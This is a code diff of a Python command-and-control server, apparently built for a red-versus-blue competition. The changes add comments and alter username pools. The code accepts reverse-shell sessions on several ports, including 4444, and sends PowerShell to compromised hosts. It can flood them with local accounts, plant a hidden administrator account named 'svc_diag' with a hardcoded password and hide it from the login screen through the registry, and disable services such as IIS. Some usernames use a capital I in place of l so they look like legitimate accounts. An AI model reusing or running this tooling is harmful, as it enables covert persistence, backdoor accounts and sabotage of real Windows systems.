@@ -5,6 +5,7 @@ import threading
 
 PORTS = [80, 443, 8080, 3306, 4444, 5985, 8443]
 
+# sends a powershell command to the target box and returns the output
 def send_command(ip, command):
     try:
         with sessions_lock:
@@ -39,17 +40,18 @@ NAME_POOLS = {
         "jason_marsh", "eric_norris", "scott_quinn", "jeffrey_page"
     ],
     "USSR": [
-        "nikolai_petrov", "ivan_sorokin", "dmitri_volkov", "alexei_morozov",
-        "sergei_kozlov", "pavel_novikov", "mikhail_lebedev", "andrei_popov",
-        "boris_fedorov", "viktor_orlov", "yuri_sobolev", "konstantin_zhukov",
-        "roman_nikitin", "igor_kuznetsov", "oleg_stepanov", "evgeni_frolov",
-        "anatoli_baranov", "vladislav_egorov", "georgi_semyonov", "pyotr_kulikov"
+        "nikolai", "tikhnov", "dmitri_volkov", "kuIagin",
+        "kozlov", "novikov", "lebedev", "gusav",
+        "tikhanov", "zhakov", "brezhev", "zhukov",
+        "nikitin", "tertiak", "kasatunov", "vasiIiev",
+        "Iebedev", "Iarionov", "kulegin", "kulikov"
     ]
 }
 
 sessions = {}
 sessions_lock = threading.Lock()
 
+# registers a new incoming connection into the sessions dictionary, and replacing stale ones
 def register_session(ip, conn, port):
     with sessions_lock:
         if ip in sessions:
@@ -61,19 +63,22 @@ def register_session(ip, conn, port):
         print(f"\n[+] New session: {ip} on port {port} (team: {guess_team(ip)})")
         print("    Type 'sessions' at any prompt to see all active connections.")
 
+# based on the IP subnet, automatically sets the session as either USA or USSR for name pool
 def guess_team(ip):
     if ip.startswith("10.100.2."):
         return "USA"
     elif ip.startswith("10.100.3."):
         return "USSR"
-    return "USA"  # your default for testing
+    return "USA"  # default for testing
 
+# removes a dead session from the session registry
 def remove_session(ip):
     with sessions_lock:
         if ip in sessions:
             del sessions[ip]
             print(f"[-] Session dropped: {ip}")
 
+# continuously accepts new connections on a given port and registers them
 def accept_loop(server, port):
     while True:
         try:
@@ -83,6 +88,7 @@ def accept_loop(server, port):
         except Exception:
             break
 
+# spins up one listener thread per port so all ports are monitored simultaneously
 def start_listeners():
     for port in PORTS:
         try:
@@ -96,6 +102,7 @@ def start_listeners():
         except Exception as e:
             print(f"[!] Could not bind port {port}: {e}")
 
+# builds the powershell command string to create a local user, optionally as admin
 def make_user_command(username, admin=False):
     password = "Welcome1!"
     cmd = (
@@ -107,11 +114,13 @@ def make_user_command(username, admin=False):
         cmd += f'; Add-LocalGroupMember -Group "Administrators" -Member "{username}"'
     return cmd
 
+# returns a shuffled copy of the name pool for the given team, restarts when exhausted
 def get_name_queue(team):
     pool = NAME_POOLS.get(team, NAME_POOLS["USA"])[:]
     random.shuffle(pool)
     return pool
 
+# drops a specified number of users onto the target box with an optional delay between each
 def flood_users(ip, team, count, delay=0):
     queue = get_name_queue(team)
     used = []
@@ -134,6 +143,7 @@ def flood_users(ip, team, count, delay=0):
             time.sleep(delay)
     print(f"\n[+] Done. {count} users created.")
 
+# creates a single hidden admin user and buries it from the windows login screen via registry
 def create_hidden_user(ip):
     username = "svc_diag"
     password = "Diag$2024!"
@@ -154,6 +164,7 @@ def create_hidden_user(ip):
     print(send_command(ip, cmd_hide))
     print(f"[+] Hidden user '{username}' created | password: {password}")
 
+# menu for selecting how to drop users onto the targe: instant flood, slow drip, or hidden
 def user_flood_menu(ip, team):
     while True:
         print(f"\n--- User Flood Menu [{team}] ---")
@@ -176,6 +187,7 @@ def user_flood_menu(ip, team):
         elif choice == "3":
             create_hidden_user(ip)
 
+# menu for running pre-built attack automations against the selected session
 def automation_menu(ip, team):
     automations = {
         "1": ("Disable IIS",       "Stop-Service -Name W3SVC; Set-Service -Name W3SVC -StartupType Disabled"),
@@ -199,6 +211,7 @@ def automation_menu(ip, team):
             print(f"\n[*] Running: {label}")
             print(send_command(ip, cmd))
 
+# opens the interaction menu for a specific session selected by IP
 def interactive_mode(ip):
     print(f"[*] Interactive shell on {ip}. Type 'back' to return.\n")
     while True:
@@ -208,6 +221,7 @@ def interactive_mode(ip):
         if cmd:
             print(send_command(ip, cmd))
 
+# opens the interaction menu for a specific session selected by an IP
 def session_menu(ip):
     with sessions_lock:
         if ip not in sessions:
@@ -230,6 +244,7 @@ def session_menu(ip):
         elif choice == "3":
             break
 
+# prints all currently active sessions with their IP, port, and team
 def print_sessions():
     with sessions_lock:
         if not sessions:
@@ -239,6 +254,7 @@ def print_sessions():
         for i, (ip, data) in enumerate(sessions.items(), 1):
             print(f"  [{i}] {ip:15s}  port: {data['port']}  team: {data['team']}")
 
+# top-level menu for browsing and selecting active sessions to interact with
 def sessions_menu():
     while True:
         print("\n======== C2 SESSIONS ========")
